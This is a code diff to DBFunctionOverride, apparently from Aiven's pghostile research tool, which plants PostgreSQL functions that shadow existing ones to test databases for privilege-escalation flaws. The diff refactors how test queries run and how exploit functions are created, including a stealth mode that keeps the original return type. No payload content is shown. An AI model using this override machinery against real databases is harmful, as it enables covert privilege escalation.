@@ -1,7 +1,7 @@
 # Copyright (c) 2022 Aiven, Helsinki, Finland. https://aiven.io
 import json
 import psycopg2
-from core.utils import convert_rettype, pgtype_get_names_map, get_test_value_for_type
+from core.utils import convert_rettype, pgtype_get_names_map, get_test_value_for_type, expand_matrix
 from core.constants import Constants
 
 class DBFunctionOverride:
@@ -18,6 +18,8 @@ class DBFunctionOverride:
         self.stealth_mode = stealth_mode
         self.created = False
         self.test_ok = False
+        self.test_failure_message = None
+        self.tested_queries = []
         self.oid = None
 
         pg_type_names = pgtype_get_names_map()
@@ -29,7 +31,7 @@ class DBFunctionOverride:
         for i in range(0, self.nparams):
             tn = pg_type_names[self.params_type[i]]
             params_names.append(tn)
-            inargs.append(f"IN {argnames[i]} {tn}")
+            inargs.append(f"{argnames[i]} {tn}")
             rtypecast = pg_type_names[self.initial_params_type[i]]
             # do not cast internal or the 'any' types
             if rtypecast == "internal" or rtypecast.startswith("any"):
@@ -40,11 +42,14 @@ class DBFunctionOverride:
         callargs = ", ".join(callargs)
         self.definition = "%s(%s)" % (self.name, ", ".join(inargs))
         self.drop_query = "drop function %s.%s(%s)" % (Constants.DESTINATON_SCHEMA, self.name, ", ".join(params_names))
-        self.test_query = "select %s(%s)" % (self.name, ", ".join(test_params))
+
+        self.test_queries = []
+        for pars in expand_matrix([test_params]):
+            self.test_queries.append("select %s(%s)" % (self.name, ", ".join(pars)))
 
         if self.stealth_mode:
             base_qry = f"""
-                create or replace function {Constants.DESTINATON_SCHEMA}.{self.definition}
+                create function {Constants.DESTINATON_SCHEMA}.{self.definition}
                 returns {pg_type_names[self.rettype]} as
                 $$
                     %s%s
@@ -54,7 +59,7 @@ class DBFunctionOverride:
             """
         else:
             base_qry = f"""
-                create or replace function {Constants.DESTINATON_SCHEMA}.{self.definition}
+                create function {Constants.DESTINATON_SCHEMA}.{self.definition}
                 returns integer as
                 $$
                     %s%s
@@ -74,27 +79,47 @@ class DBFunctionOverride:
         self.create_query_exploit = base_qry % (tracker, self.exploit_payload)
 
     def run_test(self):
+        self.tested_queries = []
+        try:
+            self.db.query(self.drop_query)
+        except psycopg2.errors.Error:
+            pass
         try:
             self.db.query(self.create_query_test)
         except psycopg2.errors.Error as e:
-            raise Exception("Database error while creating test function: %s" % e)
-        try:
-            self.db.query("drop table if exists pg_temp.___pghostile_test_wrapper")
-            self.db.query(self.test_query)
-            self.db.query("select * from pg_temp.___pghostile_test_wrapper")
-            self.db.query("drop table pg_temp.___pghostile_test_wrapper")
-            self.test_ok = True
-        except psycopg2.errors.Error as e:
-            raise Exception("Database error while testing function: %s" % e)
+            self.test_ok = False
+            self.test_failure_message = "Database error while creating test function: %s" % e
+            return False
+
+        for qry in self.test_queries:
+
+            try:
+                self.db.query("drop table if exists pg_temp.___pghostile_test_wrapper")
+                self.db.query(qry)
+                self.db.query("select * from pg_temp.___pghostile_test_wrapper")
+                self.db.query("drop table pg_temp.___pghostile_test_wrapper")
+
+                self.tested_queries.append(qry)
+                # self.test_ok = True
+            except psycopg2.errors.Error:
+                pass
 
         try:
             self.db.query(self.drop_query)
         except psycopg2.errors.Error as e:
             raise Exception("Database error while deleting test function: %s" % e)
 
-        return self.test_ok
+        if len(self.tested_queries) == 0:
+            self.test_failure_message = "No valid queries found"
+            return False
+
+        return True
 
     def create_exploit_function(self):
+        try:
+            self.db.query(self.drop_query)
+        except psycopg2.errors.Error:
+            pass
         try:
             self.db.query(self.create_query_exploit)
             self.created = True
@@ -122,7 +147,7 @@ class DBFunctionOverride:
         return self.get_oid() is not None
 
     def __str__(self):
-        return "%s %s" % (self.name, ", ".join([str(i) for i in self.params_type]))
+        return self.definition
 
     def __eq__(self, o):
-        return str(self) == str(o)
+        return self.definition == o.definition
